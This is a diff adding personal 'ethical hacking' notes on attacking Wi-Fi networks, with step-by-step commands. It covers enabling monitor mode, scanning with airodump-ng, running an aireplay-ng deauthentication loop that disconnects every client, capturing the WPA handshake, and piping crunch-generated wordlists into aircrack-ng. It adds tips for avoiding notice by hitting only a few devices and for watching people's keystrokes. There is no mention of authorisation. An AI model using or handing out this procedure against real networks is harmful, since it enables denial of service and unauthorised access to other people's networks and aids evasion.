@@ -1,0 +1,89 @@
+PenTesting / Ethical Hacking Notes: 
+
+- TOPIC: Wireless Hacking
+
+1. You are better off getting the IP of a router and attacking it directly rather than trying to crack WPA / 2. 
+The router is more than likely going to have holes in it. 
+
+2. Do not password crack on a VM. You are going to have a bad time. 
+
+3. Tools you will need: 
+aircrack <- key cracking 
+reaver <- guesses pins on a router [grab this from google code]
+
+aircrack has a package that also allows you to run a dos attack against wireless networks around you. 
+so long as you: 
+- are in close proximity to the router 
+- are able to obtain the MAC addr of the router / person via scanning
+- NIC monitor mode will be your friend [to find MAC addrs]
+
+4. Sidenote: Its time to build a dedicated linux box. 
+
+5. Crunch: 
+Use crunch to generate password lists. This is installed on Kali. 
+
+6. So now you can use crunch and pass the passwords directly into aircrack
+
+7: HOW TO: 
+
+Setup Monitor Mode
+- go into ifconfig and find your wifi card
+- ifconfig name_of_wifi_card down 
+- iwconfig name_of_wifi_card mode monitor 
+- ifconfig name_of_wifi_card up 
+
+1a. Check for interferance
+- airmon-ng check name_of_wifi_card
+IN ORDER
+- "kill process_number" kill the NETWORK MANAGER if up 
+- "kill process_number" kill the DHCLIENT if up
+- "kill process_number" kill the WPA_SUPPLICANT if up
+Kill the rest in any order you fancy.
+check one more time
+
+2a. Run a scan: 
+- airodump-ng name_of_wifi_card:
+this will show you all the access points
+BSSID: MAC addr of the access point
+PWR: is the signal strength -15 is better than -30 as an example
+
+Once you find a network to attack you will need to run a more specific scan: 
+-c is for channel
+-w write to a file
+-bssid is for MAC address
+
+- airodump-ng -c [NUMBER] -w [FILENAME] --bssid [MAC ADDRESS OF ACCESS POINT] name_of_wifi_card
+
+In the results look for a Station that is connected to the access point.
+
+3a. - BEGIN NEFARIOUS STUFF -
+
+Now with the information you have you can de-authenticat a connected device. 
+- note, when passing the second 0 you are starting a loop that will nuke everything connected. 
+If you want to temp disconnect devices you could place a 10 or 9. 
+
+- airreplay-ng -0 0 -a [MAC ADDRESS OF ACCESS POINT] name_of_wifi_card
+
+You can now stop the dos and go back into the airdump log. Wait for the WPA HANDSHAKE to appear. <----!!!!!!!!
+BE SMART: don't nuke all the devices on an access point. Only hit a few so it seems like a local machine fluke. 
+
+4a. Crack the password
+PROTIP Social Eng: take note of number / type of keystrokes people are entering in: 
+- t specify a pattern for crunch [check the man pages]
+- 11's are an example of the password length you need to pass
+-- in this example using crunch to pass a series of numbers in front of the part of the password you know and give a range. 
+then pass it to aircrack.
+- w wordlist you can either generate one or download. 
+- e SSID you are attacking 
+
+- crunch 11 11 -t %%%%Thunder 1234567890 | aircrack-ng -w -[FILENAME from step 2a] -e [SSID]
+
+If you want to run this attack using the crunch charlist you would run: 
+
+- crunch 11 11 -t %%%%Thunder -f charset.lst mixalpha-numeric-space | aircrack-ng -w -[FILENAME from step 2a] -e [SSID]
+
+
+
+
+
+
